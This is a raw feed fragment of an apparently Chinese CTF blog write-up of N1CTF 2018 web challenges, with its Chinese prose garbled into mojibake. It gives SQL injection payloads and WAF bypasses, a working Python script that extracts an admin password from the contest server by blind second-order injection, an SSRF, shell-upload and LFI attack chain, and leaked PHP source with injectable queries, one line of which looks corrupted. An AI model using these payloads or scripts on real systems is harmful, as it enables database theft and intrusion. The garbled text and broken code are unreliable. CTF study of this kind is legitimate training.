1101110111011101110111011101110111011101110111011101110111011101</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>N1ctf-webå­¦ä¹ </title>
      <link href="/2018/03/14/n1ctf-web%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/03/14/n1ctf-web%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="section">77777</h3><p>é˜Ÿå‹å†™çš„...è¿™é‡Œå°±åˆ†æä¸€ä¸‹å°±å¥½ ç»™äº†æºç  <img src="/images/2018/03/N1CTF-1.jpg" alt="blacsheep" /> è€Œä¸”é¢˜ç›®ä¹Ÿè¯´äº†,æˆ‘ä»¬è¦çš„æ˜¯adminçš„å¯†ç  ç„¶åå°±æ³¨å˜›,ç»™ä¸¤ä¸ªpayload å·¥ä½œå®¤è¿™è¾¹çš„:where ord(substr(password,[position],1))&gt;[number] -- skyçš„: where (password like 0x25) emmmm,ç¬¬äºŒä¸ªä¼¼ä¹ç®€æ´ä¸€ç‚¹,å°±å½“å­¦ä¹ ä¸€ä¸‹äº†.. æ²¡å•¥å¥½å†™çš„</p><h3 id="section-1">77777 2</h3><p>å¯ä»¥é€šè¿‡hiæ¥åˆ¤æ–­waf,è¿‡æ»¤äº†password admin point ord ascii union left mid right information_schema order as and or having whereç­‰...(test by JHSN) æ™šä¸Šæƒ³äº†å¾ˆä¹…æ€ä¹ˆç»•è¿‡åˆ—é‡Œé¢çš„passwordé‡Œé¢çš„aså’Œor...æœ€åæƒ³ä¸å‡ºæ¥..å°±å…ˆç¡äº†,ç¬¬äºŒå¤©å‘ç°é¢˜ç›®è§£å‡ºæ¥äº†,çœ‹äº†ä¸€ä¸‹é˜Ÿå‹çš„payload,å‘ç°åˆ—åæ˜¯pw,ç¬é—´å´©æºƒ.... ä¾æ—§,ä¸¤ä¸ªpayload å·¥ä½œå®¤çš„,å‘ä¸ªè®°å½•è‡ªå·±ä½“ä¼š... MitAh: DONE if((select {x pw})&gt;'h',1,0) é»‘é­”æ³• åˆ«é—®äº† JHSN: ??????? {x åˆ—å}å¯ä»¥ç”¨æ¥bypass,å…·ä½“æœ‰ç¯‡æ–‡ç«  <a href="https://paper.seebug.org/218/" title="https://paper.seebug.org/218/">https://paper.seebug.org/218/</a> ç„¶åskyçš„: flag=10&amp;hi=%2b(pw&gt;'%s') %sè¡¨ç¤ºflag å¤šå­¦ä¹ æ–°å§¿åŠ¿...</p><h3 id="babysqli">babysqli</h3><p>äºŒæ¬¡æ³¨å…¥,æ³¨å…¥ç‚¹éƒ½è¢«æ‰¾åˆ°äº†...æ— å¥ˆçœ¼çæ²¡æ³¨æ„åˆ°payloadæ‰§è¡Œäº†....(å–‚,ä¸æ˜¯è¯´ctfæ²¡æœ‰è§†åŠ›å˜›! åœ¨userinfoé‚£é‡Œ 'or'1'='1 å¤´åƒå˜æˆ1.png 'or'1'='2 å¤´åƒå˜æˆ2.png æ‰€ä»¥è¿‡æ‰wafä¹‹åå°±å¯ä»¥æ³¨äº† å…¶ä¸­å› ä¸ºinformationè¢«banäº†,æ‰€ä»¥ç”¨mysql_innodb_table_statsç»•è¿‡ è¯¦æƒ…å¯ä»¥çœ‹<a href="http://mitah.cn/" title="http://mitah.cn/">http://mitah.cn/</a> ç„¶åå³è¾¹æœ‰ä¸ªæ”¯ä»˜å®äºŒç»´ç XD... åˆ—åæå–ä¸å‡ºæ¥,çŒœemailå’Œpassword,æ‹¿åˆ°å¯†ç  ç™»å½•ä¸€ä¸‹,userinfoå°±æ˜¯flag. è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    ok=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jilu.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            num=f.read()</span><br><span class="line">            num=<span class="built_in">int</span>(num)+<span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = &quot;1&#x27;or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/mysql_innodb_table_stats),&#123;num2&#125;,1))&gt;&#123;char&#125;#&quot;.format(num2=num2,char=char)</span></span><br><span class="line">        <span class="comment">#gtid_executed,vimg,vusers,sys_config</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27;or/**/ascii(substr((select/**/password/**/from/**/vusers/**/where/**/email=&#x27;Venenof7@nu1l.com&#x27;),&#123;num2&#125;,1))&gt;&#123;char&#125;#&quot;</span>.<span class="built_in">format</span>(num2=num2,char=char)</span><br><span class="line">        <span class="comment"># ac895b772a4ec1eff81e07aa2907afe3 -&gt; qwqa123aa</span></span><br><span class="line">        <span class="comment"># N1CTF&#123;6302fa614d6bcfc59a65b71a7535bed3&#125;</span></span><br><span class="line">        reg_data=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;infors&#123;num&#125;@nu1l.com&#x27;</span>.<span class="built_in">format</span>(num=num),<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;sleep)/*&#x27;</span>,<span class="string">&#x27;userinfo&#x27;</span>:payload&#125;</span><br><span class="line">        login_data=&#123;<span class="string">&#x27;loginuser&#x27;</span>:<span class="string">&#x27;infors&#123;num&#125;@nu1l.com&#x27;</span>.<span class="built_in">format</span>(num=num),<span class="string">&#x27;loginpass&#x27;</span>:<span class="string">&#x27;sleep)/*&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jilu.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        r=u.post(<span class="string">&#x27;http://47.75.55.61/vlogin/reg.php&#x27;</span>,data=reg_data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        r=u.post(<span class="string">&#x27;http://47.75.55.61/vlogin/login.php&#x27;</span>,data=login_data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        r=u.get(<span class="string">&#x27;http://47.75.55.61/vlogin/vpage&#x27;</span>)</span><br><span class="line">        res = re.findall(<span class="string">r&#x27;&lt;p&gt;([^&lt;]+)&lt;/p&gt;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(char),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> char==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„å…ˆå»ºä¸€ä¸ªjilu.txt,ç„¶åé‡Œé¢å†™ä¸€ä¸ªæ•°å­—,æ–¹ä¾¿æ³¨å†Œ flag:N1CTF{6302fa614d6bcfc59a65b71a7535bed3}</p><h3 id="easy-php">easy php</h3><p>è´¨é‡æŒºé«˜çš„ä¸€é“é¢˜,å½“æ—¶å¹¶æ²¡æœ‰å†™å‡ºæ¥.... ä¹–ä¹–å§å§æœ€åçŸ¥é“æ€ä¹ˆå†™äº†..ä½†æ˜¯æ—¶é—´åˆ°äº†.. åšå‡ºæ¥çš„è¯å°±ç¬¬12äº†...sad:( æ¯”èµ›ç»“æŸçœ‹å„ä½å¤§ç¥çš„éé¢„æœŸè§£..æ„Ÿè§‰è¿˜æ˜¯å­¦å¾—åˆ°å¾ˆå¤šä¸œè¥¿çš„... å®˜æ–¹çš„å¤§è‡´æ€è·¯sqlæ³¨å…¥æ‹¿åˆ°adminçš„å¯†ç ,å’Œç™»å½•ip,ä½†æ˜¯ç”±äºè¦æœ¬åœ°ç™»å½•,å°è¯•å¯»æ‰¾ssrf,ç„¶ååŠ ä¸Šcrlfç™»å½•ä¸Šå»,ç„¶åä¼ ä¸€ä¸ªshell,ç„¶åç»•è¿‡ä¸€ä¸‹&lt;?,å¯ä»¥ç”¨çŸ­æ ‡ç­¾æˆ–è€…scriptæ ‡ç­¾ä¼ ä¸ªå›¾é©¬,lfiæ‹¿åˆ°shellä¹‹ååœ¨run.shé‡Œé¢æœ‰mysqlçš„rootå¯†ç ,è¿æ¥ä¸Šå»æ‹¿åˆ°flag,å½“ç„¶è¿˜æœ‰skyå¤§ä½¬çš„session.upload_progressçš„åˆ©ç”¨,é€šè¿‡æ¡ä»¶ç«äº‰ä¼ sessionç„¶ååŒ…å«æ‹¿shell...ä¸€ä¸ªä¸ªæŠ€å·§åœ°å­¦å§ é¦–å…ˆè¿™é“é¢˜ä¸€æ‹¿åˆ°,çœ‹ä¸‹æºç æ³„æ¼,å‘ç°index.php~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;views/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³„æ¼,ç„¶åè¿˜æœ‰user.php~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>, <span class="variable">$userid</span>, <span class="variable">$is_admin</span>, <span class="variable">$allow_diff_ip</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userid = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>]:-<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;is_admin = <span class="keyword">isset</span>(<span class="variable">$_</span>.<span class="number">0</span>[<span class="string">&#x27;is_admin&#x27;</span>])?<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_allow_diff_ip</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_username</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/is&#x27;</span>,<span class="variable">$username</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&lt;<span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">        @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_allow_diff_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">        @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;allow_diff_ip&#x27;</span>,<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ret</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$user</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;allow_diff_ip = (<span class="keyword">int</span>)<span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>, <span class="number">5</span>)!==<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;code erroar&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_username</span>(<span class="variable">$username</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; limit 1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="number">4</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="variable">$user</span>[<span class="number">2</span>] !== <span class="title function_ invoke__">get_ip</span>())</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;You can only login at the usual address&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="number">3</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>] = <span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;username = <span class="variable">$user</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;userid = <span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>, <span class="number">5</span>)!==<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;code error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_username</span>(<span class="variable">$username</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line"></span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="keyword">array</span>(<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="title function_ invoke__">get_ip</span>(),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)); </span><br><span class="line">                <span class="comment">//No one could be admin except me</span></span><br><span class="line">                <span 